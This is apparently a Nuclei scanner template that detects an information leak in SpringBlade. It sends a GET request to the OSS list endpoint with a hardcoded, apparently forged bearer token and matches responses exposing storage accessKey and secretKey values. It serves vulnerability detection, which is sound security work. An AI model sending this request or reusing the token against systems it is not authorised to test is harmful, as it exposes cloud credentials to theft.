id: springblade-oss-list-info-leak

info:
  name: SpringBlade OSS List Information Leak
  author: ProjectDiscoveryAI
  severity: medium
  tags: info-leak,springblade

http:
  - raw:
      - |
        GET /api/blade-resource/oss/list HTTP/1.1
        Host: {{Hostname}}
        Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"success":true'
      - type: regex
        part: body
        regex:
          - '"categoryName":"[\u4e00-\u9fa5]+"'
          - '"accessKey":"[0-9a-zA-Z]+"'
          - '"secretKey":"[0-9a-zA-Z]+"'
      - type: word
        part: header
        words:
          - "application/json"
